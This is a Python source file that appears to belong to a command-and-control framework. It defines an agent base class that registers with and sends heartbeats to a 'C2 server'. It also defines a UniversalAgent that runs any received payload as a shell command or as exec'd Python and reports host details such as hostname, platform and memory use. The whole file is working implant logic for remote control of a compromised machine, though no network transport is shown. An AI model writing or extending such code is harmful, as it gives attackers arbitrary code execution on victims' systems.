"""Base agent class for all agent types."""
import uuid
import json
from abc import ABC, abstractmethod
from typing import Dict, List, Optional, Any
from datetime import datetime


class BaseAgent(ABC):
    """Base class for all agent types."""
    
    def __init__(self, agent_id: Optional[str] = None, config: Optional[Dict] = None):
        self.agent_id = agent_id or str(uuid.uuid4())
        self.config = config or {}
        self.created_at = datetime.now()
        self.last_seen = datetime.now()
        self.is_active = True
        self.metadata = {}
        self.tasks = []
    
    @abstractmethod
    def execute_task(self, task: Dict[str, Any]) -> Dict[str, Any]:
        """Execute a task and return result."""
        pass
    
    @abstractmethod
    def get_system_info(self) -> Dict[str, Any]:
        """Get system information from agent."""
        pass
    
    @abstractmethod
    def get_status(self) -> Dict[str, Any]:
        """Get current agent status."""
        pass
    
    def register(self) -> Dict[str, Any]:
        """Register agent with C2 server."""
        return {
            "agent_id": self.agent_id,
            "type": self.__class__.__name__,
            "created_at": self.created_at.isoformat(),
            "metadata": self.metadata
        }
    
    def heartbeat(self) -> Dict[str, Any]:
        """Send heartbeat to C2 server."""
        self.last_seen = datetime.now()
        return {
            "agent_id": self.agent_id,
            "timestamp": self.last_seen.isoformat(),
            "status": self.get_status()
        }
    
    def add_task(self, task: Dict[str, Any]) -> None:
        """Add task to task queue."""
        self.tasks.append(task)
    
    def get_pending_tasks(self) -> List[Dict[str, Any]]:
        """Get pending tasks."""
        return [t for t in self.tasks if t.get("status") == "pending"]
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert agent to dictionary."""
        return {
            "agent_id": self.agent_id,
            "type": self.__class__.__name__,
            "created_at": self.created_at.isoformat(),
            "last_seen": self.last_seen.isoformat(),
            "is_active": self.is_active,
            "metadata": self.metadata,
            "tasks_count": len(self.tasks)
        }
    
    def __repr__(self) -> str:
        return f"{self.__class__.__name__}({self.agent_id})"


class UniversalAgent(BaseAgent):
    """Universal agent for command execution."""
    
    def execute_task(self, task: Dict[str, Any]) -> Dict[str, Any]:
        import subprocess
        
        task_type = task.get("type", "cmd")
        payload = task.get("payload", "")
        
        try:
            if task_type == "cmd":
                result = subprocess.check_output(payload, shell=True, text=True, timeout=30)
                return {"status": "success", "result": result}
            elif task_type == "python":
                exec_globals = {}
                exec(payload, exec_globals)
                return {"status": "success", "result": "Python code executed"}
            else:
                return {"status": "error", "message": f"Unknown task type: {task_type}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def get_system_info(self) -> Dict[str, Any]:
        import platform
        import socket
        
        try:
            import psutil
            memory = psutil.virtual_memory()
            cpu_percent = psutil.cpu_percent()
        except:
            memory = None
            cpu_percent = None
        
        return {
            "hostname": socket.gethostname(),
            "platform": platform.system(),
            "processor": platform.processor(),
            "cpu_percent": cpu_percent,
            "memory_percent": memory.percent if memory else None,
        }
    
    def get_status(self) -> Dict[str, Any]:
        return {
            "agent_id": self.agent_id,
            "is_active": self.is_active,
            "type": "universal",
            "system_info": self.get_system_info()
        }

